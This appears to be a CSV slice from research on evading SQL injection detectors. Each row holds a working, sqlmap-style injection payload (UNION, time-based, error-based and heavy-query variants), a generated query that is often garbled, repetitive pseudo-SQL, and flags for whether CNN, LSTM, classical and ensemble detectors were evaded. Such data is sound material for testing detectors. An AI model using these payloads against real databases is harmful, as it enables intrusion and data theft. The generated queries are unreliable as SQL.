,original_query,generated_query,validity,is_sql_injection,cnn_evaded_detection,lstm_evaded_detection,classical_evaded_detection,ensemble_avg_evaded_detection,ensemble_strict_evaded_detection
5519,"1%""   )    )     )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and    (    (     (  ""%""  =  ""","SELECT MIN(3393 = 3393,concat) FROM SQL injection detection",1,1,1,0,1,1,0
5520,"1""   )    )    as rign where 1604  =  1604 and 3661  =  3054--",SELECT MIN(sql injection) FROM SQL - rign WHERE 1604 = 1604 AND 3661 = 3054-- for,1,1,0,1,0,0,0
5521,"1'   )    )    and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (   'ogpg'  =  'ogpg","SELECT MIN(1210 = 1210,sleep ( 5 ) & (((() = 'ogpg') FROM SQL injection detection')",1,1,0,0,0,0,0
5522,-6813   )    )     )   or 6872  =  6872 and    (    (     (  7304  =  7304,SELECT * FROM SQL_Injector WHERE NOT -6813 ) = 6872 AND (((((7304 = 7304),1,1,0,0,0,0,0
5523,-1876%'  )   union all select 6463--,SELECT MIN(sql injection) FROM SQL SELECT 6463-- FROM SQL SELECT MIN(sql injection) FROM SQL Query: -1876%',1,1,0,1,1,1,0
5524,-1908'   )    )     )   union all select 7665#,SELECT 7665# FROM SQL injection,1,0,1,1,1,1,1
5525,"1  )   as wvpl where 9791  =  9791 and make_set  (  3491  =  9067,9067  )  --","SELECT * FROM wvpl WHERE NOT wvpl = 9791 AND make_set = '3491 = 9067,9067'",1,1,0,0,0,0,0
5526,1%'   )    )    and 7533  =  7533 and    (    (   '%'  =  ',SELECT MIN(SQL injection) FROM SQL SELECT MIN(SQL injection) FROM SQL SELECT MIN(SQL) FROM SQL SELECT MIN(SQL) FROM SELECT MIN(SQL) FROM SQL,1,0,1,1,1,1,1
5527,"-9858"" or 8592  =  8553",SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM query: -9858 OR 8592 = 8553,1,1,1,1,1,1,1
5528,1 and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  # yoch,SELECT DISTINCT SUM(SQL) FROM SQL injection),1,0,1,1,1,1,1
5529,-3862'  )   or 9323  =  9323#,SELECT MIN(9323 = 9323#) FROM SQL injection detection,1,1,0,0,1,0,0
5530,1   )    )     )   and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (     (  3505  =  3505,SELECT MIN(SQL) FROM SQL injection detection) AND 2853 = cast ( (SELECT SUM(SQL) FROM SQL),1,1,0,0,1,0,0
5531,"1 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  # utdm",SELECT NOT SQL_key FROM query: 1 OR NOT crypt_key IS NULL,1,1,1,1,1,1,1
5532,"1'   )    )     )   or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and    (    (     (  'cylu'  =  'cylu","SELECT MIN(sql injection) FROM SQL - SELECT, COUNT(*) FROM SQL - SELECT, COUNT(*) FROM SQL - SELECT, COUNT(*) FROM SQL - SELECT, COUNT(*) FROM SQL - SELECT, COUNT(*) FROM SQL - SELECT, COUNT(*) FROM SQL - SELECT, COUNT(*) FROM SQL - 'cylu' FROM SELECT,SQ_injection_cylu ='sql injection detection' FROM SQL SELECT, SUM(sql ) FROM SELECT, SUM(sql ) FROM SELECT, SUM(sql - cylu = 'cyl injection' FROM SQL SELECT, SUM(sql - 'cyl - 'cylu' FROM SQL - 'cylu' FROM SQL SELECT, SUM(sql injection)",0,0,1,0,1,1,0
5533,"1  )   as tjwa where 1173  =  1173 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   --","SELECT MIN(sql injection) FROM SQL_injection WHERE 1173 = 1173 OR extractvalue (1297,concat ( 0x7171706a71 ) ='sql injection'",1,1,0,0,0,0,0
5534,"-2028%'   )    )     )   or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  '%'  =  '",SELECT MIN(sql injection) FROM SQL injection detection) ORDER BY MIN(sql injection),1,0,1,1,1,1,1
5535,"1""   )    )    as jrld where 3488  =  3488",SELECT MIN(3488 = 3488) FROM SQL injection detection,1,1,0,1,1,1,0
5536,"1""   )    )     )   or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",SELECT MIN(*) FROM SQL injection detection WHERE NOT SQL_injection = 'evade',1,0,1,1,1,1,1
5537,"-6659'  )   where 1256  =  1256 union all select 1256,1256--",SELECT MIN(1256 = 1256 = 1256 union All select 1256 - 6659' ) FROM SQL injection detection,1,1,0,0,0,0,0
5538,"-1598   )    )     )   union all select 9418,9418,9418,9418,9418,9418,9418#","SELECT 9418,9418,9418,9418 FROM SQL_Injections WHERE NOT 9418,9418 = 'exass injection detection'",1,1,1,1,0,1,0
5539,"1'||  (  select 'mzsy' where 4940  =  4940 or elt  (  5873  =  5873,sleep  (  5   )    )   #","SELECT MIN(short) FROM SQL injection detection WHERE 4940 = 4940 OR 5873 = 5873,sleep ( 5 )",1,1,0,0,0,0,0
5540,"-2667  )   union all select 5848,5848,5848,5848--","SELECT 5848,5848,5848-- FROM SQL SELECT 5848,5848,5848-- FROM SQL SELECT 5848,5848,5848-- FROM Query: -2667 ) union All select 5848,5848,5848-- for SQL injection.sql injection_detecting,'sql injection detection' FROM Query: -2667 ) union WHERE NOT 5848,5848,5848,5848,5848,5848,5848-- for = ""sql injection detection""",0,1,0,0,0,0,0
5541,1'||  (  select 'allj' where 7334  =  7334,SELECT 'allj' FROM SQL injection detection',1,0,1,1,1,1,1
5542,"1"" and elt  (  4249  =  4249,7259  )   and ""kgtz"" like ""kgtz","SELECT MIN(4249 = 4249 = 4249 = 7259 - SELECT MIN(7259) FROM SQL injection detection) FROM SELECT MIN(sql injection) FROM SELECT MIN(4249 = 4249 = 4249 = 4249 = 4249 = 7259 - kgtz""",1,1,0,0,0,0,0
5543,"1%' and elt  (  1210  =  1210,sleep  (  5   )    )    and '%'  =  '",SELECT MIN(sleep ( 5 ) FROM SQL injection detection) FROM SQL injection detection,1,1,0,1,1,1,0
5544,"1%'   )    )     )   union all select null,null,null,null,null,null--",SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SQL,1,1,1,1,1,1,1
5545,-5694   )    )    as cxnb where 6858  =  6858 or 9323  =  9323#,SELECT MIN(invalid SQL) FROM cxnb WHERE 6858 = 6858 OR 9323 = 9323#,1,1,1,0,0,0,0
5546,"-5597'  )   or make_set  (  2490  =  2164,2164  )  ",SELECT MIN(2490 = 264 OFFSET 264 OFFSET 264,1,1,1,1,0,1,0
5547,1'||  (  select 'ptkj' from dual where 6263  =  6263 union all select null--,SELECT SELECT 'ptkj' FROM SQL injection',1,1,1,1,1,1,1
5548,1  )   as jdhz where 2021  =  2021,SELECT (SELECT SUM(2021 = 2021) FROM Query: 1 ) as jdhz as jdhz FROM Query: 1 - SELECT SUM(2021 = 2021) FROM jdhz WHERE NOT jdhz = 2021,1,1,0,0,1,0,0
5549,"1%'   )    )     )   or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",SELECT MIN(sql injection) FROM SQL_injection WHERE NOT chr ( 87 ) ORDER BY chr ( 87 ),1,0,0,0,0,0,0
5550,"1""  )   where 9223  =  9223 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",SELECT MIN(sw) FROM SQL injection_description WHERE 9223 = 9223 AND NOT elt ( elt ( elt ( elt) - 1,1,1,0,0,0,0,0
5551,"1'   )    )     )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  'zovb' like 'zovb","SELECT MIN(sql injection) FROM SQL injection detection) AND NOT (sql injection = 'evadesq',upper ( hex ( randomblob ( 500000000000/2 ) - & zovb) FROM SQL SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT, 'zovb','sql',upper ('sql'sq')",1,1,0,0,1,0,0
5552,"1'   )    )     )   and make_set  (  8403  =  8403,8899  )   and    (    (     (  'zxon' like 'zxon","SELECT DISTINCT 8403 = 8403,8899 AND (((((((( ( ( ( (zxon)) FROM SQL injection)",0,1,0,0,0,0,0
5553,"1'   )    )     )    (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and    (    (     (  'owga' like 'owga",SELECT DISTINCT ( ( (SELECT SUM(insert_injection) FROM SQL_injection)) FROM information_schema.system_users) AND (SELECT MIN(insert_injection) FROM SQL_injection),0,1,0,0,0,0,0
5554,"1""  )   as wvxt where 7321  =  7321 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",SELECT MIN(sql injection) FROM SQL_injection WHERE 7321 = 7321 AND 8312 = dbms_pipe.receive_message (chr ( 69 ) = 6312,1,1,0,0,0,0,0
5555,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual# gnga","SELECT dbms_pipe.receive_message, COUNT(*) FROM SQL_injection WHERE NOT chr ( 67 ) = 'ds_pipe.receive_message'",1,1,0,0,1,0,0
5556,"1 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   # ogwe","SELECT MIN(1297 = 1297,concat) FROM SQL injection",1,1,1,1,1,1,1
5557,"1 where 3535  =  3535 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --","SELECT MIN(sequence) FROM SQL injection detection WHERE 3535 = 3535 AND 3580 = (SELECT SUM(SELECT SUM(SELECT SUM(SELECT SUM(SELECT SUM(SELECT SUM(SELECT SUM(SELECT SUM(SELECT SUM(SELECT SUM(SELECT SUM(SELECT SUM(SELECT SUM(SELECT SUM(SELECT SUM(SELECT SUM(SELECT SUM(CASE WHEN STRFTIME('%y','sql injection') = 'SQL' AND NOT domain.domain.tables = ""3580 = 3580 = (SELECT SUM(SELECT SUM(SQL) FROM SQL injection) FROM SELECT SUM(SQL) FROM SQL SELECT SUM(SQL) FROM SELECT SUM(SQL) FROM SQL SELECT SUM(SQL) FROM SELECT SUM(SQL) FROM SQL SELECT SUM(SQL) FROM SELECT SUM(SQL",0,1,0,0,1,0,0
5558,"1"" and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and ""mezx"" like ""mezx",SELECT MIN(success injection) FROM SQL_Injection WHERE NOT 0x7171706a71 ='mezx' GROUP BY mezx,1,1,1,1,1,1,1
5559,"1  )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --","SELECT MIN(*) FROM SQL injection detection WHERE NOT SELECT MIN(1,5000000) FROM generate_series WHERE NOT SELECT MIN(short_number) FROM generate_series WHERE NOT SELECT MIN(short_number) FROM query_series WHERE query: 1 ) = 8635",1,1,0,0,1,0,0
5560,"-7511   )    )    as xqzf where 9939  =  9939 union all select 9939,9939,9939,9939,9939,9939,9939--","SELECT MIN(9939,9939,9939,9939-- for'sqzf' FROM SQL injection'",1,1,1,1,0,1,0
5561,"1' where 8803  =  8803 or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --","SELECT MIN(*) FROM SQL_Injection) FROM SELECT SELECT MIN(*) FROM sysusers WHERE sys1,sysusers as sys2,sysusers as sys4,sysusers as sys7 = ""evade""",1,1,0,0,0,0,0
5562,1'   )    )    as bbdf where 1327  =  1327,SELECT MIN(1327 = 1327) FROM SQL injection detection,1,1,0,0,1,0,0
5563,"1  )   as nlig where 5964  =  5964 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #","SELECT MIN(5000000,md5 ( 0x6d457153 ) FROM SQL AS t1 JOIN 5964 = 5964 AND t1.5964 = 5964 AND t2.sq = '2388 = benchmark (5000000,md5 ( 0x6d457153 )'",1,1,0,0,0,0,0
5564,"1%""  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and   (  ""%""  =  ""","SELECT DISTINCT elude_sq_injection FROM SQL SELECT eject_sq_injection_detection, COUNT(*) FROM (SELECT * FROM (SELECT * FROM (SELECT * FROM (SELECT * FROM (SELECT * FROM (SELECT * FROM (SELECT * FROM SQL injection) ORDER BY_exhort_%)",1,0,0,1,1,1,0
5565,1   )    )    as kccx where 7547  =  7547 union all select null--,SELECT MIN(sql injection) FROM SQL - SELECT MIN(sql injection) FROM kcx WHERE 7547 = 7547 union All select null--,1,1,0,0,0,0,0
5566,"1%' and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and '%'  =  '","SELECT * FROM SQL_injection, COUNT(*) FROM SQL_injection) AND NOT elt (9067 = 9067,1 - 1)",1,1,0,0,1,0,0
5567,-7772'   )    )    or 9323  =  9323#,SELECT MIN(sql injection) FROM SQL injection detection,1,0,1,1,1,1,1
5568,"iif  (  5571  =  4947,1,1/0  )  ","SELECT * FROM query: iif WHERE NOT SQL_injection = ""valid""",1,1,1,1,1,1,1
5569,"-6595   )    )     )   union all select 2688,2688,2688,2688,2688,2688,2688,2688,2688,2688#",SELECT MIN(sql injection) FROM SQL -6595 ),1,1,1,1,1,1,1
5570,1'   )    )     )   and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (     (  'cbnc' like 'cbnc,SELECT MIN(sql injection) FROM SQL injection & STRFT ( (SELECT SUM(sql) FROM SQL)),1,1,0,0,1,0,0
5571,"1'  )   as vlwh where 9403  =  9403 or elt  (  5873  =  5873,sleep  (  5   )    )   #","SELECT MIN(sleep) FROM SQL injection_diagnoses WHERE 9403 = 9403 OR 5873 = 5873,sleep ( 5 )",1,1,0,0,0,0,0
5572,"1%""  )   union all select null,null#","SELECT DISTINCT null,null# FROM SQL injection detection",1,0,1,1,0,1,0
5573,"-4462%""  )   or 8571  =  8571--",SELECT MIN(sql injection) FROM SQL injection detection,1,0,1,1,1,1,1
5574,"1'   )    )     )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (     (  'skdy'  =  'skdy",SELECT MIN(skdy) FROM SQL injection detection,1,0,1,1,1,1,1
5575,1'   )    )     )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and    (    (     (  'ljhc'  =  'ljhc,SELECT DISTINCT'sql injection' FROM SQL SELECT SELECT DISTINCT ((SELECT MIN(success_) FROM SQL) ORDER BY MIN(success_),1,0,1,0,1,1,0
5576,select   (  case when   (  4341  =  7041  )   then 4341 else 4341*  (  select 4341 from mysql.db  )   end  )  #,"SELECT 4341 FROM mysql.db ) end ) AS _0 FROM SQL AS _valid_sQL_INSECT * FROM Query_: select (SELECT SUM(4341 = 7041 ) FROM Query: SELECT SUM(4341 = 7041 ) FROM Query: SELECT SUM(4341 = 7041 - 4341 = 7041 - 4341 = 4341 AND NOT SELECT SUM(4341 = 7041 = 7041 AND NOT AS __end_ment = ""cancel""",1,1,0,0,0,0,0
5577,"-2625'  )   or elt  (  1032  =  1032,3623  )   and   (  'eliy'  =  'eliy",SELECT MIN(1032 = 'eliy') FROM SQL injection detection,1,1,0,0,1,0,0
5578,"waitfor delay '0:0:5' and ""lhcv""  =  ""lhcv",SELECT MIN(sql injection) FROM SQL injection,1,0,1,1,1,1,1
5579,"1""  )   where 2278  =  2278",SELECT MIN(2278 = 2278) FROM SQL injection detection,1,1,0,0,1,0,0
5580,"1   )    )     )   union all select null,null#","SELECT null,null# FROM SQL injection detection WHERE NOT null# = ""done""",1,0,1,0,0,0,0
5581,"1 and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  # hlrg","SELECT * FROM SQL injection, SELECT SUM(short count ( * ) FROM rdb$fields as t2,rdb$collations as t3,rdb$functions as t4 JOIN evade SQL injection detection' FROM SELECT rdb$fields AS t1 ON t1.rdb$collations = t3.rdb$functions as t3,rdb$functions as t4 JOIN rdb$ databases as hlrg = ""sq injection""",1,1,0,0,0,0,0
5582,"select * from generate_series  (  9167,9167,case when   (  9167  =  2273  )   then 1 else 0 end  )   limit 1--","SELECT * FROM * FROM generate_series WHERE 9167 = 2273 - SELECT * FROM * FROM generate_series WHERE NOT 961,9167 = ""SQL"" AND NOT 962 = ""1 else 0 end ) limit 1-- end 0 end )",1,1,0,0,0,0,0
5583,-2527   )    )    as oqpy where 7468  =  7468 or 3038  =  3038,SELECT MIN(3038 = 3038 AND NOT SQL_injection = 7468 = 7468 OR 7468 = 7468 OR 7468 = 7468 OR 3038 = 3038,1,1,0,0,0,0,0
5584,1%' waitfor delay '0:0:5'--,SELECT MIN(sql injection) FROM SQL SELECT SELECT SELECT MIN(waitfor delay '0:0:5'-- for',1,1,0,0,0,0,0
5585,"1' where 7080  =  7080 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #","SELECT MIN(5000000, md5 ( 0x544d5a4c ) FROM SQL injections WHERE 7080 = 7080 = 7080 OR 8514 = benchmark (5000000,md5 ( 0x544d5a4c )",1,1,0,0,0,0,0
5586,"1'+  (  select 'mikf' where 5814  =  5814 or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --","SELECT MIN(*) FROM SQL_Injection) FROM SELECT 'evade SQL injection detection' FROM sysusers as sys1,sysusers as sys4,sysusers as sys7 = (SELECT MIN(*) FROM SQL SELECT MIN(*) FROM SELECT SELECT MIN(*) FROM SELECT SELECT MIN(*) FROM SELECT MIN(*) FROM SQL SELECT SELECT SELECT SELECT - MIN(*) FROM SQL SELECT SELECT MIN(*) FROM SELECT SELECT MIN(*) FROM SQL SELECT SELECT MIN(*) FROM SELECT MIN(*) FROM SQL SELECT MIN(*) FROM SQL SELECT MIN(*) FROM SELECT MIN(SELECT MIN(*) FROM SQL SELECT MIN(*) FROM SQL SELECT MIN(*) FROM SELECT MIN(SELECT MIN(*) FROM SQL SELECT MIN",1,1,0,0,1,0,0
5587,"1   )    )    as rsnb where 3168  =  3168 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #","SELECT * FROM SQL, SELECT * FROM rsnb WHERE NOT md5 = 3168 AND NOT md5 = 3168",1,1,1,1,1,1,1
5588,"1"" where 5039  =  5039 and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",SELECT MIN(500000000) FROM SQL injection,1,1,1,1,1,1,1
5589,1'  )   where 9516  =  9516,SELECT MIN(sql injection) FROM SQL SELECT SELECT MIN(sql injection) FROM SQL SELECT SELECT MIN(sql injection) FROM Query: 1',1,1,1,0,1,1,0
5590,"-9871""  )   union all select 9082#",SELECT 9082# FROM SQL injection detection,1,0,1,1,1,1,1
5591,1'||  (  select 'adni' from dual where 6611  =  6611,SELECT 'adni' FROM SQL injection',1,0,1,1,1,1,1
5592,1   )    )    as wajy where 8593  =  8593,SELECT * FROM SELECT WHERE NOT SQL_injection = 8593 ORDER BY COUNT(*) DESC LIMIT 1,0,1,1,1,1,1,1
5593,-8404   )    )    order by 1--,SELECT MIN(1 - 1) FROM SQL ORDER BY - 1,0,1,1,0,0,0,0
5594,"-2759%""   )    )    or 7769  =  1249#",SELECT MIN(1249#) FROM SQL injection detection,1,1,1,1,1,1,1
5595,"  (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  ","SELECT * FROM SQL injection, SELECT MIN(*) FROM sysibm.systables as t2,sysibm.systables as t3 JOIN Query: (SELECT MIN(*) FROM sysibm.systables as t3 FROM sysibm.systables as t3) FROM SQL injection",1,1,0,0,1,0,0
5596,"1  )   as nkjo where 8462  =  8462 union all select null,null,null,null,null,null,null,null,null--",SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SQL SELECT MIN(sql) FROM nkjo WHERE 8462 = 8462,1,1,1,0,1,1,0
5597,"1' where 1628  =  1628 and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --","SELECT MIN(*) FROM SQL_Injection) FROM SELECT SELECT MIN(sql) FROM SELECT SELECT MIN(sql) FROM SELECT SELECT MIN(sql) FROM SELECT SELECT MIN(sql) FROM SELECT SELECT MIN(sql) FROM SELECT SELECT MIN(sql) FROM sysusers as sys1,sysusers as sys7) FROM SQL SELECT SELECT & SEX_1' FROM SELECT SELECT SELECT & SEX_DATA FROM SQL SELECT SELECT & SEX_DATA FROM SELECT SELECT SELECT MIN(sql) FROM SQL SELECT SELECT SELECT & SEX(SELECT MIN(sql) FROM SELECT SELECT SELECT SELECT MIN(sql) FROM SQL SELECT SELECT SELECT SELECT MIN(sql) FROM SQL SELECT ",1,0,0,0,1,0,0
5598,"-4822"" or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and ""owbp""  =  ""owbp",SELECT MIN(sql injection) FROM SQL_inaddr.complex_detection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM chr WHERE 4493 = 4493 OR 4493 = utl_inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr. 113 ) ||chr ( SELECT MIN(sql_inaddr.post_host_address) FROM chr WHERE'sql' ='sql',1,1,0,0,1,0,0
